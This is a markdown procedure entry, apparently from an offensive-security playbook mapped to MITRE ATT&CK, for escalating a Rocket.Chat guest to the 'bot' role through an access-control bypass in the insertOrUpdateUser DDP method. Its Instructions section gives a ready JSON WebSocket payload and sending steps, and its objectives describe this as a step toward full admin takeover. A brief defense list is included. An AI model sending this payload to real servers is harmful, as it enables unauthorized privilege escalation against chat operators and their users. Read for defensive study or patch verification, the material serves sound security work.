---
id: proc-escalate-to-bot-insertOrUpdateUser
tags:
  - privilege-escalation
  - acl-bypass
  - ddp-method
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/insertOrUpdateUser-DDP-Message]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:26.997Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Escalate-Guest-to-Bot-Role-via-insertOrUpdateUser

## Summary

This procedure exploits improper access controls in Rocket.Chat's insertOrUpdateUser DDP method to add the 'bot' role to a guest user, granting manage-own-integrations permission for further escalation.

## Description

The insertOrUpdateUser method lacks sufficient validation for self-modifications, allowing guests to append intermediate roles like 'bot' without direct admin checks. This targets the DDP WebSocket endpoint in Meteor-based Rocket.Chat, assuming guest session and known _id. Expected outcome: User roles updated to include 'bot', enabling integration creation.

## Requirements

1. Active guest session and extracted _id
2. WebSocket access to DDP (browser console or tool like Postman WebSocket)
3. Target Rocket.Chat version vulnerable to ACL bypass (pre-patch)

## Defense

Defensive measures and detection strategies:

- Implement strict permission checks in insertOrUpdateUser for all role changes
- Audit DDP method calls and block self-escalation attempts
- Enable role change logging with alerts for guest-initiated updates

## Objectives

1. Bypass ACLs to gain 'bot' permissions
2. Enable creation of custom integrations
3. Bridge to full admin escalation

## Instructions

### Step 1: Prepare DDP Message

**Context**: Construct the method call payload using the user's _id.

Use [[commands/insertOrUpdateUser-DDP-Message]]:

```json
{"msg":"method","method":"insertOrUpdateUser","params":[{"_id": "<USER_ID>", "roles": ["user", "bot"]}], "id":"17"}
```

> Replace <USER_ID>. Expected output: Valid JSON payload ready for transmission.

### Step 2: Send via WebSocket

**Context**: Transmit the message over the established DDP connection.

Paste into browser console or WebSocket client connected to ws://target.com/websocket.

> Send and monitor response. Expected output: Success message with updated user object.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/insertOrUpdateUser-DDP-Message]]

## Tools Used


## Tags

- privilege-escalation
- acl-bypass
